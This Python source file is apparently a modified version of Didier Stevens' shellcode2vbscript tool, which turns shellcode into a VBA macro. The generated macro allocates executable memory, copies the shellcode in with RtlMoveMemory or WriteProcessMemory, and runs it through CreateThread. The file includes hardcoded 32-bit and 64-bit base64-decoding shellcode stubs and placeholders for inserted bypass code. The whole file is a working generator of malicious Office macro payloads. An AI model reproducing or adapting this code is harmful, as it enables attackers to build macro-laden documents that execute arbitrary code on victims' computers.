#!/usr/bin/env python

__description__ = 'Tool to create a VBA script containing shellcode to execute'
__author__ = 'Didier Stevens'
__version__ = '0.5'
__date__ = '2016/11/16'

"""

Source code put in public domain by Didier Stevens, no Copyright
https://DidierStevens.com
Use at your own risk

History:
  2008/11/22: V0.1 forked from file2vbscript
  2010/02/13: V0.2 added base64 option
  2012/12/19: Fixed BASE64 line length to 80 in stead of 81
  2013/04/24: V0.3 added x64 option; thanks to dominic@sensepost.com
  2013/04/26: Added base64 encoding for x64
  2015/09/18: V0.4 added option --nocreatethread and --writememory
  2015/11/29: refactoring, added option --start
  2016/11/16: V0.5 added option -S

Todo:
"""

import optparse
import base64
import io

def Shellcode2VBA(filenameShellcode, encoding, x64, nocreatethread, writememory, start, suffix, shellcode=None):
    
    declares = set()
    outfile = io.StringIO()
    payload = ''
    countLine = 0
    countSubs = 1
    line = ''
    
    # Get payload from file or from buffer
    if shellcode is None:
        fPayload = open(filenameShellcode, 'rb')
        payload = fPayload.read()
        fPayload.close()
    else:
        payload = shellcode
    
    # Encode payload (if requested)
    if encoding == 'base64':
        # to simplify the base64 shellcode decoder, we make the payload's size to be a multiple of 3 by padding with 0-bytes
        # end mark the end of the base64 string with character =
        payloadLenMod3 = len(payload) % 3
        if payloadLenMod3 > 0:
            payload += b'\x00' * (3 - payloadLenMod3)
        payload = base64.standard_b64encode(payload) + b'='
        payload = payload.decode('utf-8')

    # Handle declares
    if not x64:
        declares.add('Private Declare Function VirtualAlloc Lib "KERNEL32" Alias "VirtualAlloc" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long')
        if writememory == 'move':
            declares.add('Private Declare Sub RtlMoveMemory Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal lDestination As Long, ByVal sSource As String, ByVal lLength As Long)')
        else:
            declares.add('Private Declare Function WriteProcessMemory Lib "KERNEL32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer')
        declares.add('Private Declare Function CreateThread Lib "KERNEL32" Alias "CreateThread" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long')
    else:
        declares.add('Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" Alias "VirtualAlloc" (ByVal lpAddress As LongPtr, ByVal dwSize As LongLong, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr')
        if writememory == 'move':
            declares.add('Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal lDestination As LongPtr, ByVal sSource As String, ByVal lLength As Long)')
        else:
            declares.add('Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" Alias "WriteProcessMemory" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As Any, ByVal nSize As LongLong, ByRef lpNumberOfBytesWritten As LongPtr) As Long')
        declares.add('Private Declare PtrSafe Function CreateThread Lib "msvcrt" Alias "_beginthread" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr) As LongPtr')

    declares.add('Const MEM_COMMIT = &H1000')
    declares.add('Const PAGE_EXECUTE_READWRITE = &H40')
    
    # Start creating the VBA template
    # Handle module and bypass code
    outfile.write('\n')
    outfile.write('{{bypassCode}}\n')
    outfile.write('\n')
    outfile.write('{{moduleCode}}\n')
    outfile.write('\n')
    # Create sub routine for allocating memory, 
    # copying the shellcode into that memory, 
    # and creating a thread to run the shellcode
    outfile.write(('Public Sub %s()\n' % (start + suffix)))
    outfile.write('\tDim sShellCode As String\n')
    if not x64:
        outfile.write('\tDim lpMemory As Long\n')
        outfile.write('\tDim lResult As Long\n')
    else:
        outfile.write('\tDim lpMemory As LongPtr\n')
        outfile.write('\tDim lResult As LongPtr\n')
    outfile.write('\n')
    outfile.write('{{bypassCalls}}\n')
    outfile.write('\n')
    outfile.write('{{moduleCalls}}\n')
    outfile.write('\n')
    outfile.write('\tsShellCode = ShellCode%s()\n' % suffix)
    outfile.write('\tlpMemory = VirtualAlloc(0&, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n')
    if writememory == 'move':
        outfile.write('\tRtlMoveMemory lpMemory, sShellCode, Len(sShellCode)\n')
    else:
        outfile.write('\tlResult = WriteProcessMemory(-1&, lpMemory, sShellCode, Len(sShellCode), 0&)\n')
    if nocreatethread:
        outfile.write('\tMsgBox "Address: " & Hex(lpMemory)\n')
    else:
        if not x64:
            outfile.write('\tlResult = CreateThread(0&, 0&, lpMemory, 0&, 0&, 0&)\n')
        else:
            outfile.write('\tlResult = CreateThread(lpMemory, 0&, 0&)\n')
    outfile.write('End Sub\n')
    outfile.write('\n')

    if encoding == 'legacy':
        outfile.write('Private Function ParseBytes(strBytes) As String\n')
        outfile.write('\tDim aNumbers\n')
        outfile.write('\tDim sShellCode As String\n')
        outfile.write('\tDim iIter\n')
        outfile.write('\n')
        outfile.write('\tsShellCode = ""\n')
        outfile.write('\taNumbers = split(strBytes)\n')
        outfile.write('\tfor iIter = lbound(aNumbers) to ubound(aNumbers)\n')
        outfile.write('\t\tsShellCode = sShellCode + Chr(aNumbers(iIter))\n')
        outfile.write('\tnext\n')
        outfile.write('\n')
        outfile.write('\tParseBytes = sShellCode\n')
        outfile.write('End Function\n')
        outfile.write('\n')

    # Create the sub-functions containing the pieces of shellcode (limited due to literal restricitons in VBA)
    outfile.write('Private Function ShellCode%d%s() As String\n' % (countSubs, suffix))
    outfile.write('\tDim sShellCode As String\n')
    outfile.write('\n')
    outfile.write('\tsShellCode = ""\n')

    # Itereate over the payload creating sub-functions for each piece of shellcode
    # Each piece can have 99 lines of 80 characters
    for inbyte in payload:
        if encoding == 'legacy':
            if len(line) > 0:
                line = line + ' '
            line = line + '%d' % inbyte
        else:
            line = line + '%s' % inbyte
        if len(line) >= 80:
            if encoding == 'legacy':
                outfile.write('\tsShellCode = sShellCode + ParseBytes("%s")\n' % line)
            else:
                outfile.write('\tsShellCode = sShellCode + "%s"\n' % line)
            line = ''
            countLine += 1
            if countLine > 99:
                countLine = 0
                outfile.write('\n')
                outfile.write('\tShellCode%d%s = sShellCode\n' % (countSubs, suffix))
                outfile.write('End Function\n')
                outfile.write('\n')
                countSubs += 1
                outfile.write('Private Function ShellCode%d%s() As String\n' % (countSubs, suffix))
                outfile.write('\tDim sShellCode As String\n')
                outfile.write('\n')
                outfile.write('\tsShellCode = ""\n')

    if len(line) > 0:
        if encoding == 'legacy':
            outfile.write('\tsShellCode = sShellCode + ParseBytes("%s")\n' % line)
        else:
            outfile.write('\tsShellCode = sShellCode + "%s"\n' % line)

    outfile.write('\n')
    outfile.write('\tShellCode%d%s = sShellCode\n' % (countSubs, suffix))
    outfile.write('End Function\n')
    outfile.write('\n')

    # Create the function to assemble all the pieces and return the combined shellcode buffer
    outfile.write('Private Function ShellCode%s() As String\n' % suffix)
    outfile.write('\tDim sShellCode As String\n')
    outfile.write('\n')
    if encoding == 'legacy':
        outfile.write('\tsShellCode = ""\n')
    elif x64:
        # Base64 decoding stub for 64-bit (sc-x64-md3.asm)
        outfile.write('\tsShellCode = chr(&hEB) + chr(&h3A) + chr(&h31) + chr(&hD2) + chr(&h80) + chr(&h3B) + chr(&h2B) + chr(&h75) + chr(&h04) + chr(&hB2) + chr(&h3E) + chr(&hEB) + chr(&h26) + chr(&h80) + chr(&h3B) + chr(&h2F)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h75) + chr(&h04) + chr(&hB2) + chr(&h3F) + chr(&hEB) + chr(&h1D) + chr(&h80) + chr(&h3B) + chr(&h39) + chr(&h77) + chr(&h07) + chr(&h8A) + chr(&h13) + chr(&h80) + chr(&hEA) + chr(&hFC)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hEB) + chr(&h11) + chr(&h80) + chr(&h3B) + chr(&h5A) + chr(&h77) + chr(&h07) + chr(&h8A) + chr(&h13) + chr(&h80) + chr(&hEA) + chr(&h41) + chr(&hEB) + chr(&h05) + chr(&h8A) + chr(&h13)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h80) + chr(&hEA) + chr(&h47) + chr(&hC1) + chr(&hE0) + chr(&h06) + chr(&h08) + chr(&hD0) + chr(&h48) + chr(&hFF) + chr(&hC3) + chr(&hC3) + chr(&h48) + chr(&h8D) + chr(&h0D) + chr(&h30)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h00) + chr(&h00) + chr(&h00) + chr(&h48) + chr(&h89) + chr(&hCB) + chr(&h31) + chr(&hC0) + chr(&h80) + chr(&h3B) + chr(&h3D) + chr(&h74) + chr(&h26) + chr(&hE8) + chr(&hB0) + chr(&hFF)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hAB) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA6) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA1) + chr(&hFF) + chr(&hFF)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hFF) + chr(&h86) + chr(&hC4) + chr(&hC1) + chr(&hC0) + chr(&h10) + chr(&h86) + chr(&hC4) + chr(&hC1) + chr(&hC8) + chr(&h08) + chr(&h89) + chr(&h01) + chr(&h48) + chr(&h83) + chr(&hC1)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h03) + chr(&hEB) + chr(&hD3)\n')
    else:
        # Base64 decoding stub for 32-bit (sc-md3.asm)
        outfile.write('\tsShellCode = chr(&hEB) + chr(&h3A) + chr(&h31) + chr(&hD2) + chr(&h80) + chr(&h3B) + chr(&h2B) + chr(&h75) + chr(&h04) + chr(&hB2)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h3E) + chr(&hEB) + chr(&h26) + chr(&h80) + chr(&h3B) + chr(&h2F) + chr(&h75) + chr(&h04) + chr(&hB2) + chr(&h3F)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hEB) + chr(&h1D) + chr(&h80) + chr(&h3B) + chr(&h39) + chr(&h77) + chr(&h07) + chr(&h8A) + chr(&h13) + chr(&h80)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hEA) + chr(&hFC) + chr(&hEB) + chr(&h11) + chr(&h80) + chr(&h3B) + chr(&h5A) + chr(&h77) + chr(&h07) + chr(&h8A)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h13) + chr(&h80) + chr(&hEA) + chr(&h41) + chr(&hEB) + chr(&h05) + chr(&h8A) + chr(&h13) + chr(&h80) + chr(&hEA)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h47) + chr(&hC1) + chr(&hE0) + chr(&h06) + chr(&h08) + chr(&hD0) + chr(&h43) + chr(&hC3) + chr(&hEB) + chr(&h05)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hE8) + chr(&hF9) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&h5B) + chr(&h31) + chr(&hC9) + chr(&h80) + chr(&hC1)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h36) + chr(&h01) + chr(&hCB) + chr(&h89) + chr(&hD9) + chr(&h31) + chr(&hC0) + chr(&h80) + chr(&h3B) + chr(&h3D)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&h74) + chr(&h25) + chr(&hE8) + chr(&hAB) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA6) + chr(&hFF)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA1) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&h9C) + chr(&hFF)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hFF) + chr(&hFF) + chr(&h86) + chr(&hC4) + chr(&hC1) + chr(&hC0) + chr(&h10) + chr(&h86) + chr(&hC4) + chr(&hC1)\n')
        outfile.write('\tsShellCode = sShellCode + chr(&hC8) + chr(&h08) + chr(&h89) + chr(&h01) + chr(&h83) + chr(&hC1) + chr(&h03) + chr(&hEB) + chr(&hD4)\n')
    for iIter in range(1, countSubs+1):
        outfile.write('\tsShellCode = sShellCode + ShellCode%d%s()\n' % (iIter, suffix))
    outfile.write('\n')
    outfile.write('\tShellCode%s = sShellCode\n' % suffix)
    outfile.write('End Function\n')
    outfile.write('\n')
    
    # Get the generated VBA as a buffer
    data = outfile.getvalue()
    outfile.close()
    
    return data, declares

# def Main():
#     oParser = optparse.OptionParser(usage='usage: %prog [options] infile outfile.vbs\n' + __description__ + '\nVersion V' + __version__, version='%prog ' + __version__)
#     oParser.add_option('-e', '--encoding', default='base64', help='select encoding: base64 (default) or legacy')
#     oParser.add_option('-x', '--x64', action='store_true', default=False, help='generate VBA for 64-bit')
#     oParser.add_option('-n', '--nocreatethread', action='store_true', default=False, help='do not call CreateThread')
#     oParser.add_option('-w', '--writememory', default='move', help='select how to write to memory: move (default) or process')
#     oParser.add_option('-s', '--start', default='ExecuteShellCode', help='name of start Sub (default ExecuteShellCode)')
#     oParser.add_option('-S', '--suffix', default='', help='Suffix for function names')
#     (options, args) = oParser.parse_args()
#
#     if len(args) != 2 or not options.encoding in ('legacy', 'base64') or not options.writememory in ('move', 'process'):
#         oParser.print_help()
#         print ''
#         print '  %s' % __description__
#         print '  Source code put in the public domain by Didier Stevens, no Copyright'
#         print '  Use at your own risk'
#         print '  https://DidierStevens.com'
#         return
#
#     else:
#         Shellcode2VBA(args[0], args[1], options.encoding, options.x64, options.nocreatethread, options.writememory, options.start, options.suffix)
#
# if __name__ == '__main__':
#     Main()
